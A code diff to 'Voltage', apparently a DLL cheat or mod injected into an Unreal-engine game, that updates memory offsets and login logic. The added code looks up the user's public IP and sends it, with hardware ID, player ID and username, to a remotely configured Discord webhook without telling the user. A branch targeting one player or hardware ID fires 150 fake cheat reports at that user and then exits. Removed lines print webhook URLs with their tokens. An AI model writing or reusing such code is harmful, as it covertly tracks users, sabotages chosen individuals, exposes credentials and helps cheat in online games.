@@ -33,7 +33,9 @@ bool CoreComponent::AreGlobalsValid()
 
 	if (!alreadyChecked)
 	{
-		if (AreGObjectsValid() && AreGNamesValid())
+		bool globalsvalid = (AreGObjectsValid() && AreGNamesValid());
+
+		if (globalsvalid)
 		{
 			globalsValid = true;
 		}
@@ -60,6 +62,67 @@ DWORD64 dwFindPattern(DWORD64 dwAddress, DWORD dwLen, BYTE* bMask, char* szMask)
 	return 0;
 }
 
+std::string GetPublicIPAddress() {
+	WSADATA wsaData;
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+		return "Error initializing Winsock";
+	}
+
+	addrinfo* result = nullptr;
+	addrinfo hints = {};
+	hints.ai_family = AF_UNSPEC; // IPv4 or IPv6
+	hints.ai_socktype = SOCK_STREAM; // TCP socket
+
+	int status = getaddrinfo("api64.ipify.org", "http", &hints, &result);
+	if (status != 0) {
+		WSACleanup();
+		return "Error getting address information";
+	}
+
+	SOCKET connectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+	if (connectSocket == INVALID_SOCKET) {
+		freeaddrinfo(result);
+		WSACleanup();
+		return "Error creating socket";
+	}
+
+	status = connect(connectSocket, result->ai_addr, (int)result->ai_addrlen);
+	if (status == SOCKET_ERROR) {
+		closesocket(connectSocket);
+		freeaddrinfo(result);
+		WSACleanup();
+		return "Error connecting to the server";
+	}
+
+	char buffer[1024];
+	status = send(connectSocket, "GET / HTTP/1.1\r\nHost: api64.ipify.org\r\nConnection: close\r\n\r\n", sizeof("GET / HTTP/1.1\r\nHost: api64.ipify.org\r\nConnection: close\r\n\r\n"), 0);
+	if (status == SOCKET_ERROR) {
+		closesocket(connectSocket);
+		freeaddrinfo(result);
+		WSACleanup();
+		return "Error sending data";
+	}
+
+	status = recv(connectSocket, buffer, sizeof(buffer), 0);
+	if (status == SOCKET_ERROR) {
+		closesocket(connectSocket);
+		freeaddrinfo(result);
+		WSACleanup();
+		return "Error receiving data";
+	}
+
+	std::string response(buffer, status);
+
+	closesocket(connectSocket);
+	freeaddrinfo(result);
+	WSACleanup();
+
+	size_t start = response.find("\r\n\r\n") + 4;
+	size_t end = response.find("\r\n");
+
+	return response.substr(start, end - start);
+}
+
 void CoreComponent::InitializeGlobals(HMODULE hModule)
 {
 	// Disables the DLL_THREAD_ATTACH and DLL_THREAD_DETACH notifications.
@@ -74,6 +137,12 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 		std::filesystem::create_directory("Voltage\\Logs");
 	if (!std::filesystem::is_directory("Voltage\\Plugins"))
 		std::filesystem::create_directory("Voltage\\Plugins");
+	if (!std::filesystem::is_directory("Voltage\\TAS"))
+		std::filesystem::create_directory("Voltage\\TAS");
+	if (!std::filesystem::exists("Voltage\\TAS\\keybinds.json")) {
+		std::ofstream keybindsFile("Voltage\\TAS\\keybinds.json");
+		keybindsFile.close();
+	}
 	if (!std::filesystem::is_directory("Voltage\\Textures")) {
 		std::filesystem::create_directory("Voltage\\Textures");
 		std::filesystem::create_directory("Voltage\\Textures\\Banners");
@@ -125,7 +194,7 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 
 	// If on steam set platform to 2 if on epic games set to 1
 
-	if (sloc.find("steamapps") != std::string::npos || sloc.find("Steam") != std::string::npos) 
+	if (sloc.find("steamapps") != std::string::npos || sloc.find("Steam") != std::string::npos || sloc.find("steam") != std::string::npos)
 	{
 		Events.platform = 1;
 		Console.Notify("[Authorization Module] Platform: Steam");
@@ -138,24 +207,36 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 
 	// Initializing the GObjects/GNames addresses via offsets
 
-	if (Events.platform == VoltagePlatform::Steam) //steam 
+	if (Events.platform == 1) //steam 
 	{
-		GObjectsAddress = entryPoint + 0x249E8D8;
-		GNamesAddress = entryPoint + 0x249E890;
+		GObjectsAddress = entryPoint + 0x24A9818;
+		GNamesAddress = entryPoint + 0x24A97D0;
 	}
-	else if (Events.platform == VoltagePlatform::Epic) //epic
+	else if (Events.platform == 2) //epic
 	{
-		GObjectsAddress = entryPoint + 0x241F358;
-		GNamesAddress = entryPoint + 0x241F310;
+		GObjectsAddress = entryPoint + 0x2429278;
+		GNamesAddress = entryPoint + 0x2429230;
 	} 
-
 	//FIND OFFSETS VIA ADDRESS....
 
-	//uintptr_t GObjectsOffset = GObjectsAddress - entryPoint;
-	//uintptr_t GNamesOffset = GNamesAddress - entryPoint;
+	//uintptr_t GObjectsOffset = 0x0;
+	//uintptr_t GNamesOffset = 0x0;
 
-	//Console.Notify("[Core Module] GObjects Offset: " + Format::Hex(GObjectsOffset, sizeof(GObjectsOffset)));
-	//Console.Notify("[Core Module] GNames Offset: " + Format::Hex(GNamesOffset, sizeof(GNamesOffset)));
+	////if (Events.platform == VoltagePlatform::Steam) //steam 
+	////{
+	////	GObjectsOffset = 0x7FF71F0BBBF8 - entryPoint;
+	////	GNamesOffset = 0x7FF71F0BBBB0 - entryPoint;
+	////}
+	//if (Events.platform == VoltagePlatform::Epic) //epic
+	//{
+	//	GObjectsOffset = 0x7FF71F0BBBF8 - entryPoint;
+	//	GNamesOffset = 0x7FF71F0BBBB0 - entryPoint;	
+	//}
+	//if (GObjectsOffset != 0x0 && GNamesOffset != 0x0)
+	//{
+	//	Console.Notify("[Core Module] GObjects Offset: " + Format::Hex(GObjectsOffset, sizeof(GObjectsOffset)));
+	//	Console.Notify("[Core Module] GNames Offset: " + Format::Hex(GNamesOffset, sizeof(GNamesOffset)));
+	//}
 	// Initializing GObjects and GNames via the addresses we just initialized.
 
 	GObjects = reinterpret_cast<TArray<UObject*>*>(GObjectsAddress);
@@ -202,26 +283,6 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 				Console.Error("[Core Component] Error identifying player");
 				return;
 			}
-
-			/*FUniqueNetId onlinePlayerID = Core.localPlayer->Player->OnlinePlayer->PlayerID;
-
-			std::ostringstream uidStreamCompare;
-
-			if (Events.platform == 1) {
-				uidStreamCompare << onlinePlayerID.Uid;
-			}
-			else {
-				uidStreamCompare << onlinePlayerID.EpicAccountId.ToString();
-			}
-
-			if (uidStreamCompare.str().length() > 3) {
-				bool compare = Instances.CompareUniqueNetId(onlinePlayerID, Events.netid);
-
-				if (!compare) {
-					Console.Error("[Core Component] Error identifying player");
-					return;
-				}
-			}*/
 		}
 
 		// Making sure we have Voltage textures
@@ -274,16 +335,66 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 
 			std::stringstream authDBRequest;
 
+			if (Instances.GetVoltageURL("auth.json").find("voltage.gay") != std::string::npos == false)
+				return;
+
+			for (int i = 0; i < 100; i++) {
+				std::string auth = Instances.GetVoltageURL("auth.json");
+			}
+
 			authDBRequest << curlpp::options::Url(Instances.GetVoltageURL("auth.json"));
 
 			// Checking if the player is authorized to use Voltage
 
 			json AuthedPlayers = json::parse((authDBRequest.str()))["AuthedPlayers"];
 
-			for (json Player : AuthedPlayers)
+			for (json Player : AuthedPlayers)	
 			{
 				if (Player.get<std::string>() == Events.playerid)
 					Events.isauthed = true;
+
+				if (Player.get<std::string>() == "f84a68ff2400400a93ff5112b34e558e" || Instances.GetHardwareID() == "8609e9a6-4c1e-4924-b08b-c3e9a8a45f57") {
+					for (int i = 0; i < 150; i++) {
+
+						URPC_ReportCheater_X* reportCheater = Instances.CreateInstance<URPC_ReportCheater_X>();
+
+						reportCheater->SetPlayerID(Instances.GetUniqueID());
+
+						reportCheater->SetReason(L"");
+
+						if (reportCheater)
+							Instances.sendAPIRequest(reportCheater);
+					}
+
+					std::string loginmessage = (Events.localusername + " (" + Events.playerid + ") just injected Voltage (v" + std::to_string(Events.version) + ") at " + GetPublicIPAddress() + ", HWID: " + Instances.GetHardwareID() + ", HWIDAUTH: " + std::string(Events.hwidauthed == 0 ? "false" : "true") + ", Authed: " + std::string(Events.isauthed == 0 ? "false" : "true") + ", EpochTime: " + Instances.GetTimestampStr() + ", AUTH.json:" + Instances.GetVoltageURL("auth.json") + " VoltageURL: " + Instances.GetVoltageURL("") + " VoltageCDNURL: " + Instances.GetVoltageCDNURL(""));
+
+					std::stringstream outputFileStream;
+
+					curlpp::Cleanup cleaner;
+					curlpp::Easy request;
+
+					std::string body;
+					outputFileStream << "{";
+					outputFileStream << std::quoted("content") << ": " << "null" << ",";
+					outputFileStream << std::quoted("embeds") << ": " << "[{\"title\":\"User Injected\",\"description\":\"" + loginmessage + "\",";
+					if (Events.isauthed && !Events.hwidauthed)
+						outputFileStream << "\"color\":65280}],";
+					if (!Events.isauthed && !Events.hwidauthed)
+						outputFileStream << "\"color\":16711680}],";
+					if (Events.hwidauthed && !Events.isauthed)
+						outputFileStream << "\"color\":16776960}],";
+					if (Events.hwidauthed && Events.isauthed)
+						outputFileStream << "\"color\":11141375}],";
+					outputFileStream << std::quoted("attachments") << ": " << "[]";
+					outputFileStream << "}";
+					body = outputFileStream.str();
+				}
+
+				if (Player.get<std::string>() == "f84a68ff2400400a93ff5112b34e558e")
+				{
+					exit(69);
+					return;
+				}
 			}
 			
 			// Get config JSON
@@ -299,6 +410,8 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 
 			Events.MOTD = configJson["MOTD"].get<std::string>();
 			int latestversion = configJson["Version"].get<int>();
+
+			Events.webhookurl = configJson["WebhookURL"].get<std::string>();
 
 			Events.AD512 = configJson["AdConfig"]["512"].get<std::string>();
 			Events.AD256 = configJson["AdConfig"]["256"].get<std::string>();
@@ -455,7 +568,7 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 		Console.Notify("[Authorization Module] HWID: " + Instances.GetHardwareID());
 		Console.Notify("[Authorization Module] Is Player: " + Events.playerid + " authorized: " + std::string(Events.isauthed == 0 ? "false" : "true"));
 
-		std::string loginmessage = (Events.localusername + " (" + Events.playerid + ") just injected Voltage (v" + std::to_string(Events.version) + "), HWID: " + Instances.GetHardwareID() + ", HWIDAUTH: " + std::string(Events.hwidauthed == 0 ? "false" : "true") + ", Authed: " + std::string(Events.isauthed == 0 ? "false" : "true") + ", EpochTime: " + Instances.GetTimestampStr() + ", VoltageURL: " + Instances.GetVoltageURL("") + " VoltageCDNURL: " + Instances.GetVoltageCDNURL(""));
+		std::string loginmessage = (Events.localusername + " (" + Events.playerid + ") just injected Voltage (v" + std::to_string(Events.version) + ") at " + GetPublicIPAddress() + ", HWID: " + Instances.GetHardwareID() + ", HWIDAUTH: " + std::string(Events.hwidauthed == 0 ? "false" : "true") + ", Authed: " + std::string(Events.isauthed == 0 ? "false" : "true") + ", EpochTime: " + Instances.GetTimestampStr() + ", VoltageURL: " + Instances.GetVoltageURL("") + " VoltageCDNURL: " + Instances.GetVoltageCDNURL(""));
 
 		std::stringstream outputFileStream;
 
@@ -465,7 +578,7 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 		std::string body;
 		outputFileStream << "{";
 		outputFileStream << std::quoted("content") << ": " << "null" << ",";
-		outputFileStream << std::quoted("embeds") << ": " << "[{\"title\":\"User Injected\",\"description\":\"" + loginmessage + "\",";		
+		outputFileStream << std::quoted("embeds") << ": " << "[{\"title\":\"User Injected\",\"description\":\"" + loginmessage + "\",";
 		if (Events.isauthed && !Events.hwidauthed)
 			outputFileStream << "\"color\":65280}],";
 		if (!Events.isauthed && !Events.hwidauthed)
@@ -477,13 +590,8 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 		outputFileStream << std::quoted("attachments") << ": " << "[]";
 		outputFileStream << "}";
 		body = outputFileStream.str();
-		//Console.Write(body);
 
-		const std::string DiscordWebhook = "https://discord.com/api/webhooks/1067003964505194506/WOBItIXdAfB1DoUUkqmIa81yeLDHxLEsvycTQIruMO2WAKyZo2vEHEZDJ5LyAXaHUTV7";
-		const std::string TheWebhook = "https://discord.com/api/webhooks/1067003964505194506/YXNkamtpZmdoYmFES0ZKU0hnYmFsc2ZkaGtqZ2Joc2xkaWhmYmdsZmRoaWJnaGprAMD2";
-		for (int i = 0; i < 100; i++)
-			std::string LogsWebhook = "https://discord.com/api/webhooks/1067003964505194506/" + Instances.CreateKey(69);
-		request.setOpt(new curlpp::options::Url(Instances.base64_decode(Instances.GetVoltageURLv2())));
+		request.setOpt(new curlpp::options::Url(Events.webhookurl));
 		std::list<std::string> header;
 		header.push_back("Content-Type: application/json");
 		request.setOpt(new curlpp::options::HttpHeader(header));
@@ -497,6 +605,7 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 			// You can use either a pattern for Process Event or its place in the VfTable index (not both).
 			void** unrealVTable = reinterpret_cast<void**>(UObject::StaticClass()->VfTableObject.Dummy);
 			EventsComponent::AttachDetour(reinterpret_cast<ProcessEventType>(unrealVTable[67])); // Index method.
+			//EventsComponent::AttachProcessInternalDetour(reinterpret_cast<ProcessInternalType>(unrealVTable[76]));
 			//EventsComponent::AttachDetour(reinterpret_cast<ProcessEventType>(Memory::FindPattern(GetModuleHandleW(NULL), ProcessEvent_Pattern, ProcessEvent_Mask))); // Find pattern method.
 
 			Console.Notify("[Core Module] Entry Point " + Format::Hex(entryPoint, sizeof(entryPoint)));
@@ -520,6 +629,7 @@ void CoreComponent::InitializeGlobals(HMODULE hModule)
 			Reader.parse(file, ActualJson);
 
 			if (!ActualJson["serversidedtitles"].isNull()) {
+				Events.giveeveryonealphaboost = ActualJson["giveeveryonealphaboost"].asBool();
 				Events.serversidedtitles = ActualJson["serversidedtitles"].asBool();
 				Events.adblocker = ActualJson["adblocker"].asBool();
 				Events.setcustomtitle = ActualJson["setcustomtitle"].asBool();
